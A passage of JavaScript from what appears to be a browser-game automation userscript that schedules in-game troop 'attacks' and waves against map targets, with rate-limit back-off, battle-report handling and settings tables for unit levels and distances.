                t.dispFeedback(c + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.waveAttackTick, retry_delay);
                return
            }
            var g = Data.waves.target.units.cloneProps();
            var h = [];
            for (var i in Data.waves.target.dragons) {
                if (parseInt(Data.waves.target.dragons[i])) {
                    h[Data.waves.target.dragons[i] - 1] = i
                }
            }
            var j = (t.current_wave - 1) % (h.length);
            var k = Seed.dragons[h[j]];
            if (typeof h[j] !== "undefined" && h[j] !== null && k.is_in_city && k.can_attack && (k.life / k.maximum_life <= 0.75)) {
                g[h[j]] = 1
            }
            verboseLog("Wave attack to " + b + " Attempted");
            b = "#." + t.current_wave + " " + b;
            b += "<br>" + translate("Sending") + ": ";
            var l = [];
            for (var m in g) {
                if (g[m] > 0) {
                    l.push(translate(m) + "(" + g[m] + ")")
                }
            }
            b += l.join(" + ");
            new MyAjax.marchSend(Seed.cities[0].id, Data.waves.target.x, Data.waves.target.y, available_general.id, g, "waves", function (r) {
                var t = Tabs.Waves,
                    wave_delay, retry_delay;
                if (r.ok && r.dat.result && r.dat.result.success) {
                    Marches.add(r.dat.result.job.march_id, "waves");
                    ++Data.marches.count_limit;
                    ++t.current_wave;
                    t.attack_errors = 0;
                    if (Data.marches.count_limit > 49) {
                        if (parseInt(serverTime() - Data.marches.start_at) < 3600) {
                            wave_delay = parseInt((3600 - (serverTime() - Data.marches.start_at)) * 1000);
                            setTimeout(function () {
                                t.dispFeedback(translate("Attacks stopped momentarily to prevent server blocking") + " - " + translate("waiting") + ": " + timeFormat(wave_delay / 1000))
                            }, Data.waves.delay_min * 500)
                        } else {
                            Data.marches.start_at = serverTime();
                            Data.marches.count_limit = 1
                        }
                    } else {
                        if ((Data.marches.count_limit % 15) === 0) {
                            wave_delay = 45 * total_marches * 1000;
                            setTimeout(function () {
                                t.dispFeedback(translate("Attacks stopped momentarily to prevent server blocking") + "<br>" + translate("waiting") + ": " + timeFormat(wave_delay / 1000))
                            }, Data.waves.delay_min * 500)
                        } else {
                            wave_delay = Math.randRange(Data.waves.delay_min * 1000, Data.waves.delay_max * 1000);
                            setTimeout(function () {
                                t.dispFeedback("")
                            }, parseInt(wave_delay / 2))
                        }
                    }
                    verboseLog("Wave attack to: " + b + " Successfully");
                    actionLog(translate("Wave attack to") + ": " + b);
                    t.dispFeedback(translate("Wave attack to") + ": " + b);
                    t.attack_timer = setTimeout(t.waveAttackTick, wave_delay)
                } else {
                    ++t.attack_errors;
                    retry_delay = 60000 * (t.attack_errors * t.attack_errors);
                    verboseLog("<b>Wave<b> attack to: " + b + " <b>failed</b> and returned error: " + r.errmsg + " - retrying in " + timeFormat(retry_delay / 1000));
                    actionLog(translate("Wave attack to") + " " + b + " " + translate("failed"));
                    t.dispFeedback(translate("Wave attack to") + " " + b + " failed");
                    if (r.status === 509) {
                        retry_delay = 600000;
                        verboseLog("<b>Attack</b> to " + b + " failed - <b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(retry_delay / 1000));
                        t.dispFeedback(translate("Attack to") + " " + b + " " + translate("failed") + " - " + translate("Rate Limit Exceeded because there were too many requests") + " - " + translate("Retry in") + " " + timeFormat(retry_delay / 1000))
                    }
                    t.attack_timer = setTimeout(t.waveAttackTick, retry_delay)
                }
                setTimeout(function () {
                    t.dispFeedback("")
                }, parseInt((wave_delay || retry_delay) / 2))
            })
        },
        checkUnitsWave: function (a, b) {
            var c = 0;
            for (var p in b) {
                if (b[p] > 0) {
                    c += b[p];
                    if (Seed.cities[a].units[p] < b[p]) {
                        return (translate("Not enough") + " " + translate(p))
                    }
                }
            }
            if (c <= 0) {
                return (translate("No Troops Defined"))
            }
            return null
        },
        marchTick: function () {
            var t = Tabs.Waves;
            clearTimeout(t.march_timer);
            Marches.updateTable($id(UID.tabWave_Marches), "waves");
            t.march_timer = setTimeout(t.marchTick, 1000)
        },
        eventCoords: function (e) {
            var f = $id(UID.tabWave_CoordsX);
            var g = $id(UID.tabWave_CoordsY);
            var x = parseIntZero(f.value);
            var y = parseIntZero(g.value);
            f.value = x;
            g.value = y;
            $J("#" + UID.tabWave_Distance).html(Map.getDistance(Data.options.map.x, Data.options.map.y, x, y));
            $J("#" + UID.tabWave_Tile).html("&nbsp;");
            if (x < 0 || x > 749) {
                if (x < 0) {
                    while (x < 0) {
                        x = 750 + x
                    }
                } else {
                    while (x > 749) {
                        x = x - 750
                    }
                }
                f.style.backgroundColor = "#faa";
                return
            }
            if (y < 0 || y > 749) {
                if (y < 0) {
                    while (y < 0) {
                        y = 750 + y
                    }
                } else {
                    while (y > 749) {
                        y = y - 750
                    }
                }
                g.style.backgroundColor = "#faa";
                return
            }
            Data.waves.target.x = x;
            Data.waves.target.y = y;
            g.style.backgroundColor = "";
            f.style.backgroundColor = "";
            Map.getTargetByCoords(x, y, function (a) {
                if (a) {
                    var b = Map.names[a.t] || a.t;
                    Data.waves.target.type = b;
                    Data.waves.target.level = a.l;
                    var c = a.at ? "#000" : "#C22";
                    var d = "<font color=" + c + "><b>" + translate(b) + "&nbsp;" + translate("Level") + "&nbsp;" + a.l + "</b></font>";
                    if (a.pN) {
                        d += "<br>" + translate("City") + ": <b>" + a.n + "</b> - " + translate("Alliance") + ": <b>" + (a.aN ? a.aN : "----") + "</b><br>" + translate("Name") + ": <b>" + a.pN + "</b> - " + translate("Level") + ": <b>" + a.pL + "</b> - " + translate("Might") + ": <b>" + a.pM + "</b>"
                    }
                    $id(UID.tabWave_Tile).innerHTML = d
                }
            })
        },
        show: function () {
            var t = Tabs.Waves;
            t.marchTick()
        },
        hide: function () {
            var t = Tabs.Waves;
            clearTimeout(t.march_timer)
        }
    };
    Tabs.Attacks = {
        tab_order: I,
        tab_label: "Attacks",
        tab_disabled: !P,
        last_subtab: "tabAttackLevels",
        container: null,
        attack_timer: null,
        march_timer: null,
        timer_ticks: {
            levels: null,
            targets: null,
            stats: null,
            map: null
        },
        last_attack: 0,
        attack_errors: 0,
        check_map_busy: false,
        run_start_at: 0,
        content_type: 0,
        selected_map: "AnthropusCamp",
        units_type: ["Porter", "Conscript", "Halberdsman", "Minotaur", "Longbowman", "SwiftStrikeDragon", "BattleDragon", "ArmoredTransport", "PackDragon", "Giant", "FireMirror", "AquaTroop", "StoneTroop", "FireTroop", "WindTroop"],
        dragons_type: ["GreatDragon", "WaterDragon", "StoneDragon", "FireDragon", "WindDragon"],
        init: function (a) {
            var t = Tabs.Attacks;
            t.container = a;
            for (var x = 1; x < 12; x++) {
                if (!Data.options.attacks.units[x]) {
                    Data.options.attacks.units[x] = {}
                }
            }
            var b = "<div id=" + setUID("tabAttack_Title") + " class=" + UID.title + ">" + translate("Attack") + " " + translate(Data.options.map.selected) + " </div><div class=" + UID.status_ticker + " id=" + setUID("tabAttack_Status") + ' style="margin-bottom:5px !important"><center><input type=button value="OnOff" id=' + setUID("tabAttack_OnOff") + " /></center><div class=" + UID.status_report + ' style="margin-top:5px;height:140px; max-height:140px; overflow-y:auto;"><table id=' + setUID("tabAttack_Marches") + " class=" + UID.table + "></table></div><div id=" + setUID("tabAttack_Feedback") + " class=" + UID.status_feedback + '></div></div><ul class=tabs><li class="tab first"><a id=' + setUID("tabAttackLevels") + ">" + translate("Levels") + "</a></li><li class=tab><a id=" + setUID("tabAttackTarget") + ">" + translate("Targets") + "</a></li><li class=tab><a id=" + setUID("tabAttackStats") + ">" + translate("Statistics") + "</a></li><li class=tab><a id=" + setUID("tabAttackMaps") + ">" + translate("Map") + "</a></li><li class=tab><a id=" + setUID("tabAttackConfig") + ">" + translate("Options") + "</a></li></ul><div id=" + setUID("tabAttack_Content") + ' style="padding-top:1px; height:455px;"></div>';
            $J(t.container).html(b);
            $J("#" + UID.tabAttack_OnOff).click(function () {
                t.setAttackEnable(!Data.options.attacks.enabled)
            });
            $J("#" + UID.tabAttackLevels).click({
                subtab: 0
            }, t.showSubTab);
            $J("#" + UID.tabAttackTarget).click({
                subtab: 1
            }, t.showSubTab);
            $J("#" + UID.tabAttackStats).click({
                subtab: 2
            }, t.showSubTab);
            $J("#" + UID.tabAttackMaps).click({
                subtab: 3
            }, t.showSubTab);
            $J("#" + UID.tabAttackConfig).click({
                subtab: 4
            }, t.showSubTab);
            if (Data.options.attacks.max_marches === undefined) {
                Data.options.attacks.max_marches = 10
            }
            if (!Data.stats.start_at) {
                Data.stats.start_at = serverTime()
            }
            Messages.addBattleReportListener(t.gotBattleReport);
            setTimeout(Marches.check, 60000);
            setTimeout(t.marchTick, 1000);
            t.tabAttackLevels();
            window.addEventListener("unload", t.onUnload, false);
            t.setAttackEnable(Data.options.attacks.enabled)
        },
        show: function () {
            var t = Tabs.Attacks;
            t.content_type = Data.options.attack_tab;
            if (t.content_type === 2) {
                $id(UID.tabAttack_Content).scrollTop = 0
            }
            t.showSubTab({
                data: {
                    subtab: t.content_type
                }
            })
        },
        hide: function () {
            var t = Tabs.Attacks;
            if (t.map_viewer) {
                t.map_viewer.close()
            }
            t.clearTimerTicks()
        },
        onUnload: function () {
            debugLog("Tabs.Attacks.onUnload");
            var t = Tabs.Attacks;
            if (Data.options.attacks.enabled) {
                Data.stats.run_time += (serverTime() - t.run_start_at)
            }
            Data.options.attack_tab = t.content_type
        },
        showSubTab: function (a) {
            var t = Tabs.Attacks;
            t.content_type = a.data.subtab;
            t.clearTimerTicks();
            var b;
            switch (t.content_type) {
            case 0:
                t.tabAttackLevels();
                b = "tabAttackLevels";
                break;
            case 1:
                t.tabAttackTarget();
                b = "tabAttackTarget";
                break;
            case 2:
                t.tabAttackStats();
                b = "tabAttackStats";
                break;
            case 3:
                t.tabAttackMaps();
                b = "tabAttackMaps";
                break;
            case 4:
                t.tabAttackConfig();
                b = "tabAttackConfig";
                break
            }
            $J("#" + UID[t.last_subtab]).removeClass("selected");
            $J("#" + UID[t.last_subtab]).css("z-index", "0");
            $J("#" + UID[b]).addClass("selected");
            $J("#" + UID[b]).css("z-index", "1");
            t.last_subtab = b;
            if (t.content_type !== 3 && t.map_viewer) {
                t.map_viewer.close()
            }
        },
        clearTimerTicks: function () {
            var t = Tabs.Attacks;
            for (var a in t.timer_ticks) {
                clearTimeout(t.timer_ticks[a]);
                t.timer_ticks[a] = 0
            }
        },
        checkMapData: function () {
            var t = Tabs.Attacks;
            if (t.check_map_busy) {
                return false
            } else {
                if (Data.map.terrains[Data.options.map.selected].length === 0 && Data.options.map.selected !== "Fog") {
                    t.check_map_busy = true;
                    t.setAttackEnable(false);
                    var x = Data.options.map.x;
                    var y = Data.options.map.y;
                    var d = Data.options.map.radius = 14;
                    var e = dialogBox({
                        id: setUID("dialog-scanmap"),
                        centerTo: t.container,
                        overlay: true,
                        title: "Scanning Map",
                        html: translate("Scanning Map").replace("$NUM$", d) + "<br><br><div class=progressbar></div>"
                    });
                    Map.scanMap(x, y, d, function (a) {
                        if (a === null) {
                            e.html("<B>" + translate("Bummer, there was an error while scanning the map") + ".</B>");
                            e.centerTo();
                            e.buttons([{
                                text: translate("Ok"),
                                click: function () {
                                    e.destroy()
                                }
                            }]);
                            Tabs.Attacks.check_map_busy = false;
                            return
                        }
                        if (a.done) {
                            verboseLog("scanMap: complete!");
                            Tabs.Attacks.check_map_busy = false;
                            var b = "<center><br>" + translate("complete") + "!<br><br><table>";
                            for (var c in a.founds) {
                                b += "<tr><td>" + translate(c) + "&nbsp;</td><td>&nbsp;" + a.founds[c] + "</td></tr>"
                            }
                            b += "</table></center>";
                            e.html(b);
                            e.centerTo();
                            e.buttons([{
                                text: translate("Ok"),
                                click: function () {
                                    e.destroy()
                                }
                            }]);
                            t.tabAttackTarget()
                        } else {
                            if (a.init) {
                                bj.start({
                                    target: $J("#" + UID["dialog-scanmap"] + " .progressbar"),
                                    steps: Map.steps
                                })
                            } else {
                                bj.update(Map.step)
                            }
                        }
                    });
                    return false
                }
            }
            return true
        },
        gotBattleReport: function (r) {
            var t = Tabs.Attacks;
            debugLog("Tabs.Attacks.gotBattleReport");
            var a = null;
            for (var b in Data.marches.attacks) {
                var c = Data.marches.attacks[b];
                if (c.x === r.report.location.x && c.y === r.report.location.y && c.general.id === r.report.attacker.general.id) {
                    a = b;
                    break
                }
            }
            if (a) {
                t.trackStats(a, r)
            }
            var d = r.report.spoils.items;
            if (d.length !== 0) {
                Seed.fetchPlayer({
                    noCities: true
                })
            }
            if (!Data.options.attacks.delete_reports && !Data.options.attacks.stop_on_loss) {
                return
            }
            if (Data.options.attacks.stop_on_loss) {
                for (var p in r.report.attacker.units) {
                    if (r.report.attacker.units[p][0] !== r.report.attacker.units[p][1]) {
                        var e = new Date(r.report_notification.created_at * 1000).myString();
                        t.abort(translate("Troops lost") + "! (" + e + ")");
                        return
                    }
                }
            }
            if (Data.options.attacks.delete_reports && r.report.attacker.name === Seed.player.name) {
                Messages.deleteMessage(r.report_notification.id)
            }
        },
        setAttackEnable: function (a) {
            var t = Tabs.Attacks;
            clearTimeout(t.attack_timer);
            var b = $id(UID.tabAttack_OnOff);
            Data.options.attacks.enabled = a;
            if (a) {
                b.value = translate("Attacking").toUpperCase();
                b.className = UID.btn_on;
                t.run_start_at = serverTime();
                t.current_wave = 1;
                if (!Data.waves.enabled) {
                    Data.marches.count_limit = 1;
                    Data.marches.start_at = serverTime()
                }
                t.autoCheckTargets()
            } else {
                if (t.run_start_at !== 0) {
                    Data.stats.run_time += (serverTime() - t.run_start_at)
                }
                b.value = translate("Disabled").toUpperCase();
                b.className = UID.btn_off;
                t.dispFeedback("")
            }
        },
        abort: function (a) {
            var t = Tabs.Attacks;
            t.setAttackEnable(false);
            t.dispFeedback(a);
            actionLog(a)
        },
        marchTick: function () {
            var t = Tabs.Attacks;
            clearTimeout(t.march_timer);
            Marches.updateTable($id(UID.tabAttack_Marches), "attacks");
            t.march_timer = setTimeout(t.marchTick, 1000)
        },
        dispFeedback: function (a) {
            if (a && a !== "") {
                a = new Date().toTimeString().substring(0, 8) + "&nbsp;" + a
            }
            $J("#" + UID.tabAttack_Feedback).html(a)
        },
        autoCheckTargets: function () {
            var t = Tabs.Attacks;
            var c = serverTime();
            var d = 0;
            var e = "",
                retry_delay, available_general, marching = 0,
                total_marches = 0,
                id;
            clearTimeout(t.attack_timer);
            if (!Data.options.attacks.enabled) {
                return
            }
            var f = 700000;
            var g = 0;
            for (id in Seed.marches) {
                ++total_marches;
                if (Seed.marches[id].status === "marching") {
                    ++marching
                }
                var h = (Seed.marches[id].run_at - parseInt(serverTime())) * (Seed.marches[id].status == "marching" ? 2 : 1);
                if (h > 0) {
                    f = f < h ? f : h;
                    g = g > h ? g : h
                }
            }
            if (f === 700000 || g === 0) {
                f = 3
            }
            retry_delay = (f * 1000) + Math.randRange(2000, 5000);
            if (MyAjax.march_busy > 0) {
                MyAjax.march_busy = total_marches;
                if (MyAjax.march_busy === 0) {
                    t.attack_busy = false
                }
                verboseLog("<b>Attack</b> to " + e + " delayed due to <b>" + total_marches + " pending</b> march request: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("Another march request is pending") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay);
                return
            }
            if (!t.checkMapData()) {
                return
            }
            if (marching >= Data.options.attacks.max_marches) {
                verboseLog("<b>Attack</b> to " + e + " delayed due to <b>march limit</b> reached: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("March limit reached") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay);
                return
            }
            if (getMusterPointSlots(0) <= 0) {
                verboseLog("<b>Attack</b> to " + e + " delayed due to </b>insufficent march</b> slots: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("Muster Point") + " " + translate("Full") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay);
                return
            }
            available_general = getAvailableGeneral();
            if (available_general === null) {
                verboseLog("<b>Attack</b> to " + e + " delayed due to <b>insufficent generals</b>: retry in " + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("No Generals Available") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay);
                return
            }
            var i = t.getNextAttackTarget();
            if (i) {
                if (checkAvailableUnits(0, i.l) === null) {
                    e = i.x + "/" + i.y;
                    t.sendAttack(0, i, available_general, function (r) {
                        var t = Tabs.Attacks,
                            attack_delay, retry_delay;
                        if (r.ok) {
                            var a = Data.options.attacks.delay_min;
                            var b = Data.options.attacks.delay_max;
                            if (a < X) {
                                if (b > a + 30) {
                                    a = b - 30
                                } else {
                                    a = X;
                                    b = a + 30
                                }
                                Data.options.attacks.delay_min = a;
                                Data.options.attacks.delay_max = b
                            }
                            if (Data.marches.count_limit > 49) {
                                if (parseInt(serverTime() - Data.marches.start_at) < 3600) {
                                    attack_delay = parseInt((3600 - (serverTime() - Data.marches.start_at)) * 1000);
                                    setTimeout(function () {
                                        t.dispFeedback(translate("Attacks stopped momentarily to prevent server blocking") + " - " + translate("waiting") + ": " + timeFormat(attack_delay / 1000))
                                    }, a * 500)
                                } else {
                                    Data.marches.start_at = serverTime();
                                    Data.marches.count_limit = 1
                                }
                            } else {
                                if ((Data.marches.count_limit % 15) === 0) {
                                    attack_delay = 45 * total_marches * 1000;
                                    setTimeout(function () {
                                        t.dispFeedback(translate("Attacks stopped momentarily to prevent server blocking") + "<br>" + translate("waiting") + ": " + timeFormat(attack_delay / 1000))
                                    }, a * 500)
                                } else {
                                    attack_delay = Math.randRange(a * 1000, b * 1000);
                                    setTimeout(function () {
                                        t.dispFeedback("")
                                    }, parseInt(attack_delay / 2))
                                }
                            }
                            t.attack_timer = setTimeout(t.autoCheckTargets, attack_delay)
                        } else {
                            retry_delay = 30000 * (t.attack_errors > 0 ? t.attack_errors * t.attack_errors : 1);
                            if (r.status && r.status === 509) {
                                retry_delay = 600000;
                                verboseLog("<b>Attack</b> to " + e + " failed - <b>Rate Limit Exceeded</b>, too many requests! -  Retry in :" + timeFormat(retry_delay / 1000));
                                t.dispFeedback(translate("Attack to") + " " + e + " " + translate("failed") + " - " + translate("Rate Limit Exceeded because there were too many requests") + " - " + translate("Retry in") + " " + timeFormat(retry_delay / 1000))
                            } else {
                                if (r.errmsg) {
                                    verboseLog("<b>Attack</b> to " + e + " delayed due to </b>" + r.errmsg + "</b>: retry in " + timeFormat(retry_delay / 1000));
                                    t.dispFeedback(r.errmsg + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000))
                                }
                            }
                            t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay)
                        }
                    });
                    return
                } else {
                    verboseLog("<b>Attack</b> to " + e + " delayed due to <b>insufficient troops</b>: retry in " + timeFormat(retry_delay / 1000));
                    t.dispFeedback(translate("Not enough") + " " + translate("Troops") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                    t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay)
                }
            } else {
                verboseLog("<b>Attack</b> to " + e + "<b>Requirements Unmet</b>: Retry in" + timeFormat(retry_delay / 1000));
                t.dispFeedback(translate("Requirements Unmet") + ": " + translate("Retry in") + " " + timeFormat(retry_delay / 1000));
                t.attack_timer = setTimeout(t.autoCheckTargets, retry_delay)
            }
        },
        sendAttack: function (a, b, c, d) {
            var t = Tabs.Attacks;
            var e = serverTime();
            if (t.attack_busy) {
                t.dispFeedback(translate("Error") + ": " + translate("sendAttack is busy, no response from server?"));
                return
            }
            var f = translate("Attack sent to") + ": " + translate(Data.options.map.selected) + " " + translate("Level") + " " + b.l + " " + translate("at") + " " + b.x + "/" + b.y;
            var g = "Attack sent to: " + Data.options.map.selected + " Level " + b.l + " at " + b.x + "/" + b.y;
            var h = Data.options.attacks.units[b.l].cloneProps();
            var i = false;
            var j = false;
            for (var k = 0; k < t.dragons_type.length; k++) {
                var l = t.dragons_type[k];
                var m = h[l];
                if (m > 0) {
                    i = true;
                    var n = Seed.dragons[l];
                    if (!n.is_in_city || !n.can_attack || (n.life / n.maximum_life <= 0.75) || j) {
                        h[l] = 0
                    } else {
                        j = true
                    }
                }
            }
            if (i && !j) {
                if (d) {
                    d({
                        ok: false,
                        errmsg: translate("Dragon") + " " + translate("Unavailable")
                    })
                }
                return
            }
            verboseLog(g + " Attempted");
            debugLog("units :\n" + inspect(h, 4, 1));
            t.attack_busy = true;
            t.last_attack = e;
            new MyAjax.marchSend(Seed.cities[a].id, b.x, b.y, c.id, h, "attacks", function (r) {
                t.attack_busy = false;
                if (r.ok && r.dat.result && r.dat.result.success) {
                    Marches.add(r.dat.result.job.march_id, "attacks");
                    ++Data.marches.count_limit;
                    b.lst = e;
                    t.attack_errors = 0;
                    verboseLog(g + " Successfully");
                    t.dispFeedback(f);
                    if (Data.options.attacks.log_attacks) {
                        actionLog(f)
                    }
                    if (d) {
                        d(r)
                    }
                } else {
                    ++t.attack_errors;
                    verboseLog(g + " <b>failed and returned error</b>: " + r.errmsg);
                    actionLog(f + " " + translate("failed"));
                    t.dispFeedback(f + " failed");
                    if (d) {
                        d(r)
                    }
                }
            })
        },
        getNextAttackTarget: function (c) {
            var t = Tabs.Attacks;
            var d = 0;
            var e = null;
            var f = null;
            c = (c !== undefined ? c : Data.options.map.selected);
            var g = Data.options.attacks.level_enable.cloneProps();
            for (var i = 0; i < g.length; i++) {
                if (g[i] && checkAvailableUnits(0, i) !== null) {
                    g[i] = false
                }
            }
            var h = t.getActiveObjectList(c, g);
            h.sort(function (a, b) {
                return a.d - b.d
            });
            for (var i = 0; i < h.length; i++) {
                f = h[i];
                if (f && f.at) {
                    if (f.lst === 0) {
                        e = f;
                        break
                    } else {
                        if (d === 0) {
                            d = f.lst;
                            e = f
                        } else {
                            if (d > f.lst) {
                                d = f.lst;
                                e = f;
                                break
                            }
                        }
                    }
                }
            }
            if (e === null) {
                return
            }
            return e
        },
        getActiveObjectList: function (a, b) {
            var t = Tabs.Attacks;
            var c = [];
            b = (b !== undefined) ? b : Data.options.attacks.level_enable;
            a = (a !== undefined ? a : Data.options.map.selected);
            var d = t.filter_targets.strip();
            var e = (/(City|Outpost|Wildernesses)/.test(a) && d.length > 0);
            var f = new RegExp(RegExp.escape(d), "i");
            if (Data.map.terrains[a]) {
                for (var i = 0; i < Data.map.terrains[a].length; i++) {
                    var g = (Data.map.terrains[a])[i];
                    if (g && b[g.l] && (Data.options.attacks.level_dist[g.l] === 0 || Data.options.attacks.level_dist[g.l] >= g.d) && (!e || (e && ((g.n && f.test(g.n)) || (g.pN && f.test(g.pN)) || (g.aN && f.test(g.aN)))))) {
                        c.push(g)
                    }
                }
            }
            return c
        },
        checkAttack: function (a, b) {
            var t = Tabs.Attacks;
            var c = Seed.cities[0].id;
            var d = 0;
            var e;
            var f = Data.options.attacks.units[a.l];
            var g = 0;
            for (var h in f) {
                if (f[h] > 0) {
                    g += f[h];
                    if (Seed.cities[d].units[h] < f[h]) {
                        b(translate("Not enough") + " " + translate(h));
                        return
                    }
                }
            }
            if (g <= 0) {
                b(translate("No Troops Defined"));
                return
            }
            var i = getMusterPointLevel(d) * 10000;
            if (g > i) {
                b(translate("Too many troops for muster point level"));
                return
            }
            if (getMusterPointSlots(d) <= 0) {
                b(translate("Muster Point") + " " + translate("Full"));
                return
            }
            if ((e = getAvailableGeneral()) === null) {
                b(translate("No Generals Available"));
                return
            }
            var j = translate("Manual attack sent to") + ": " + translate(Data.options.map.selected) + " " + translate("Level") + " " + a.l + " " + translate("at") + " " + a.x + "/" + a.y;
            var k = "Manual attack sent to: " + Data.options.map.selected + " Level " + a.l + " at " + a.x + "/" + a.y;
            verboseLog(k + " Attempted");
            new MyAjax.marchSend(c, a.x, a.y, e.id, f, "attacks", function (r) {
                if (r.ok) {
                    Marches.add(r.dat.result.job.march_id, "attacks");
                    ++Data.marches.count_limit;
                    a.lst = serverTime();
                    verboseLog(k + " Successfully");
                    t.dispFeedback(j);
                    if (Data.options.attacks.log_attacks) {
                        actionLog(j)
                    }
                    b(null)
                } else {
                    verboseLog(k + " <b>failed and returned</b> error: " + r.errmsg);
                    t.dispFeedback(translate("Error") + ": " + r.errmsg);
                    b(null)
                }
            })
        },
        tabAttackLevels: function () {
            var t = Tabs.Attacks;
            var c = Seed.cities[0];
            var d = "<div id=" + setUID("tabAttackLevels_Title") + ' class="' + UID.title + '">' + translate("Attacks") + "&nbsp;" + translate(Data.options.map.selected) + "</div>";
            setUID("tabAttackLevels_MapChoice");
            d += "<table><tr><td align=right>&nbsp;<b>" + translate("Type") + " " + translate("of") + " " + translate("Targets") + "</b></td><td>&nbsp;:<select id=" + UID.tabAttackLevels_MapChoice + ">";
            for (var e in Data.map.terrains) {
                if (e === "City") {
                    d += '<option disabled="disabled">-----------------------</option>'
                }
                d += '<option value="' + e + '" ' + (e === Data.options.map.selected ? "selected" : "") + ">" + translate(e) + "</option>"
            }
            var f = t.getActiveObjectList();
            d += +"</select></td><td><span class=jewel><div id=" + setUID("tabAttackLevels_TargetsInfo") + ' style="padding-left:5px;">' + translate("Targets") + ":&nbsp;<b>" + f.length + "</b>&nbsp;" + translate("of") + "&nbsp;<b>" + Data.map.terrains[Data.options.map.selected].length + "</b></div></span></td></tr></table>";
            d += '<div style="height:380px; overflow-y:auto"><table class="' + UID.compact_table + " " + UID.hide_inputbox + '"><tr class=' + UID.row_top_headers + '><td style="background:none !important;"></td><td align=center colspan=11>&nbsp;' + translate("Levels") + "&nbsp;</td></tr><tr><td></td><th>1</th><th>2</th><th>3</th><th>4</th><th>5</th><th>6</th><th>7</th><th>8</th><th>9</th><th>10</th><th>11</th></tr><tr align=center><td class=right>" + translate("Enable") + " </td>";
            for (var x = 1; x < 12; x++) {
                d += '<td><label style="display:block;' + (Data.options.attacks.level_enable[x] ? " background:#2A7" : "") + '"><input type=checkbox id=' + setUID("tabAttackLevels_LvlOnOff_" + x) + " ref=" + x + " " + (Data.options.attacks.level_enable[x] ? " checked" : "") + " /></label></td>"
            }
            d += "</tr><tr align=center><td class=right>" + translate("Max") + " " + translate("Distance").truncate(4, "") + " </td>";
            for (var x = 1; x < 12; x++) {
                d += "<td><input type=text id=" + setUID("tabAttackLevels_LvlDist_" + x) + " ref=" + x + ' size=2 style="width:25px;" value="' + Data.options.attacks.level_dist[x] + '"/></td>'
            }
            d += "</tr><tr><td><div class=short></div></td></tr>";
            var g = [];
            for (i = 0; i < t.units_type.length; i++) {
                if (getUnitNumbers(c, t.units_type[i]).total) {
                    var h = "#FFF";
                    if (i < 4) {
                        h = "#DDD"
                    } else {
                        if (i < 7) {
                            h = "#BEB"
                        } else {
                            if (i < 9) {
                                h = "#EEB"
                            } else {
                                if (i < 11) {
                                    h = "#BBE"
                                } else {
                                    if (i < 15) {
                                        h = "#BBE"
                                    } else {
                                        h = "#EBB"
                                    }
                                }
                            }
                        }
                    }
                    d += '<tr style="background-color:' + h + ';"><td class=right><span style="font-size:8pt;" title="' + translate(t.units_type[i]) + '">' + translate("~" + t.units_type[i]) + "<span></td>";
                    for (var x = 1; x < 12; x++) {
                        var j = Data.options.attacks.units[x][t.units_type[i]];
                        if (!j) {
                            j = 0
                        }
                        d += "<td><input type=text id=" + setUID("tabAttackLevels_LvlUnits_" + x + "_" + i) + " ref=" + (x + "_" + i) + ' maxlength=6 size=2 style="width:36px;' + (j ? "" : "color:#888;") + '" value="' + j + '" title="" /></td>'
                    }
                    d += "</tr>";
                    g.push(i)
                }
            }
            var k = 0;
            for (var l in Seed.dragons) {
                if (getAvailableDragons(Seed.dragons[l].name).status) {
                    ++k
                }
            }
            var m = [];
            if (k > 0) {
                d += '<tr><td colspan=12 style="background:none !important;">&nbsp;</td></tr><tr>  <td>&nbsp;</td>  <th colspan=11 align=center>' + translate("Send") + " " + translate("Dragon") + " " + translate("Available") + "</th></tr>";
                for (var o = 0; o < t.dragons_type.length; o++) {
                    if (getAvailableDragons(t.dragons_type[o]).status) {
                        d += '<tr align=center><td class=right><span title="' + translate(t.dragons_type[o]) + '">' + translate("~" + t.dragons_type[o]) + "<span></td>";
                        for (var x = 1; x < 12; x++) {
                            var j = Data.options.attacks.units[x][t.dragons_type[o]];
                            if (!j) {
                                j = 0
                            }
                            d += '<td><label style="display:block;background:#EBB;"><input type=checkbox id=' + setUID("tabAttackLevels_DrgOnOff_" + x + "_" + o) + " ref=" + (x + "_" + o) + " " + (j !== 0 ? " checked" : "") + " /></label></td>"
                        }
                        d += "</tr>";
                        m.push(o)
                    }
                }
            }
            d += "</table></div>";
            $J("#" + UID.tabAttack_Content).html(d);
            $J("#" + UID.tabAttackLevels_MapChoice).change(onMapChoice);
            for (var x = 1; x < 12; x++) {
                $J("#" + UID["tabAttackLevels_LvlOnOff_" + x]).change(onChangeLevelEnable);
                $J("#" + UID["tabAttackLevels_LvlDist_" + x]).change(onChangeDistance)
            }
            for (i = 0; i < g.length; i++) {
                for (var x = 1; x < 12; x++) {
                    $J("#" + UID["tabAttackLevels_LvlUnits_" + x + "_" + g[i]]).change(onChangeUnits)
                }
            }
            for (i = 0; i < m.length; i++) {
                for (var x = 1; x < 12; x++) {
                    $J("#" + UID["tabAttackLevels_DrgOnOff_" + x + "_" + m[i]]).change(onChangeDragons)
                }
            }
            function onChangeDistance(a) {
                var x = parseIntZero($J(a.target).val());
                var n = $J(a.target).attr("ref");
                if (isNaN(x) || x < 0 || x > 375) {
                    $J.msg({
                        content: "<center>" + translate("Distance must be between") + "<br> 0 " + translate("and") + " 375" + translate("miles") + "</center>",
                        timeOut: "words",
                        target: t.container
                    });
                    x = Data.options.attacks.level_dist[n]
                }
                Data.options.attacks.level_dist[n] = x
            }
